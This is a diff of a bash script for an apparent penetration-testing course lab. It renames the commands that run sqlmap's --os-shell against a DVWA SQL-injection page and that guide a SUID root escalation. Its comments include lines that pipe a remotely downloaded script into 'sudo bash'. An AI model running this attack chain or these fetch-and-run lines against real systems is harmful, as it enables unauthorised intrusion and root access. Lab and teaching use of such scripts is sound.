@@ -16,10 +16,10 @@
 # --- For Kali VM (The Attacker) ---
 #
 # Get the initial www-data shell via sqlmap (prerequisite):
-#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_shell
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_os_shell
 #
 # Display instructions on how to trigger the exploit and catch the root shell:
-#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s trigger_exploit
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s kali_trigger_exploit
 #
 
 # --- Script Configuration ---
@@ -123,7 +123,7 @@ EOF
     
     print_title "SUID Escalation Setup Complete"
     print_info "The next step is to get a 'www-data' shell via sqlmap and then trigger the exploit."
-    print_info "You can run this script with the 'trigger_exploit' argument for instructions."
+    print_info "You can run this script with the 'kali_trigger_exploit' argument for instructions."
 }
 
 ubuntu_run_peas_scan() {
@@ -169,7 +169,8 @@ kali_exploit_sqlmap_os_shell() {
     local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"; local COOKIE_STRING="Cookie: security=low; PHPSESSID=${PHPSESSID}"; local CSRF_URL="${TARGET}/login.php"
     declare -a SQLMAP_BASE_ARGS=("-u" "${SQLI_URL}" "-H" "${COOKIE_STRING}" "--csrf-token=user_token" "--csrf-url=${CSRF_URL}" "--batch" "--flush-session" "--web-root=/var/www/html/dvwa" "--output-dir=${OUTDIR}")
     local CMD="whoami"; local CMD_LOG="${OUTDIR}/initial_shell_whoami.log"
-    print_info "Attempting to get initial 'www-data' shell with 'whoami' command..."
+    print_info "Running sqlmap command: ${SQLMAP_BASE_ARGS[@]}"    
+    print_info "Attempting to get initial 'www-data' shell with 'whoami' command.."
     sudo -u "$TARGET_USER" sqlmap "${SQLMAP_BASE_ARGS[@]}" --os-shell
     print_success "SQLmap OS shell process finished. If successful, you should have an interactive shell."
     print_warn "If the shell did not spawn, check the logs in ${OUTDIR} for errors."
@@ -186,7 +187,7 @@ guide_trigger_escalation() {
     print_warn "Your terminal will now be waiting. Do not close it."
     
     print_info "\n--- Step 2: In your SQLMAP OS SHELL (The www-data shell on the Target) ---"
-    print_info "You should already have an OS shell from running the 'kali_get_shell' command."
+    print_info "You should already have an OS shell from running the 'kali_get_os_shell' command."
     print_info "First, verify you are the 'www-data' user by typing:"
     echo -e "${GREEN}whoami${RESET}"
     print_info "Now, execute the SUID binary you created earlier:"
@@ -207,10 +208,10 @@ case "${1:-}" in
     "peas_scan")
         ubuntu_run_peas_scan
         ;;
-    "kali_get_shell")
+    "kali_get_os_shell")
         kali_exploit_sqlmap_os_shell
         ;;
-    "trigger_exploit")
+    "kali_trigger_exploit")
         guide_trigger_escalation
         ;;
     *)
@@ -222,8 +223,8 @@ case "${1:-}" in
         echo "  peas_scan       : Downloads and runs the linPEAS host scanner."
         echo ""
         echo "Arguments for Kali VM (Attacker):"
-        echo "  kali_get_shell  : Runs sqlmap to get the initial www-data OS shell."
-        echo "  trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
+        echo "  kali_get_os_shell  : Runs sqlmap to get the initial www-data OS shell."
+        echo "  kali_trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
         exit 1
         ;;
 esac
